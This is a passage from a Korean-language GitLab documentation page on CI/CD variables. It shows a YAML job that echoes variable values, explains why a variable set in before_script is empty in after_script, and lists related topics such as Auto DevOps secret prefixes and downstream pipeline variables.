   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

러너가 작업을 실행할 때:

1. `before_script`이(가) 실행됩니다:
   1. 출력에 인쇄합니다.
   1. `MY_VARIABLE`에 대한 변수를 정의합니다.
1. `script`이(가) 실행됩니다:
   1. 출력에 인쇄합니다.
   1. `JOB_DEFINED_VARIABLE`의 값을 인쇄합니다.
   1. `CI_COMMIT_SHA`의 값을 인쇄합니다.
   1. `MY_VARIABLE`의 값을 인쇄합니다.
1. `after_script`은(는) 새로운 별개의 셸 컨텍스트에서 실행됩니다:
   1. 출력에 인쇄합니다.
   1. `JOB_DEFINED_VARIABLE`의 값을 인쇄합니다.
   1. `CI_COMMIT_SHA`의 값을 인쇄합니다.
   1. `MY_VARIABLE`의 빈 값을 인쇄합니다. 변수 값은 `after_script`이(가) `before_script`과(와) 분리된 셸 컨텍스트에 있기 때문에 감지될 수 없습니다.

## 관련 항목 {#related-topics}

- 실행 중인 애플리케이션에 CI/CD 변수를 전달하도록 [Auto DevOps](../../topics/autodevops/_index.md)를 구성할 수 있습니다. 실행 중인 애플리케이션 컨테이너의 환경 변수로 CI/CD 변수를 사용할 수 있도록 하려면 [변수 키의 접두사](../../topics/autodevops/cicd_variables.md#configure-application-secret-variables)를 `K8S_SECRET_`로 지정합니다.

- [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck) 비디오는 [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/config-data-top-scope/config-data-subscope/config-data-monorepo) 작업 예제 의 연습입니다. 여러 수준의 그룹 CI/CD 변수를 환경 범위가 지정된 변수와 결합하여 애플리케이션 빌드 또는 배포의 복잡한 구성을 수행하는 방법을 설명합니다.

  예제를 자신의 그룹 또는 인스턴스로 복사하여 테스트할 수 있습니다. 다른 GitLab CI 패턴이 데모되는 내용에 대한 자세한 내용은 페이지에서 사용할 수 있습니다.

- [다운스트림 파이프라인에 CI/CD 변수를 전달](../pipelines/downstream_pipelines.md#pass-cicd-variables-to-a-downstream-pipeline)할 수 있습니다. [`trigger:forward` 키워드](../yaml/_index.md#triggerforward)를 사용하여 다운스트림 파이프라인에 전달할 변수의 유형을 지정합니다.
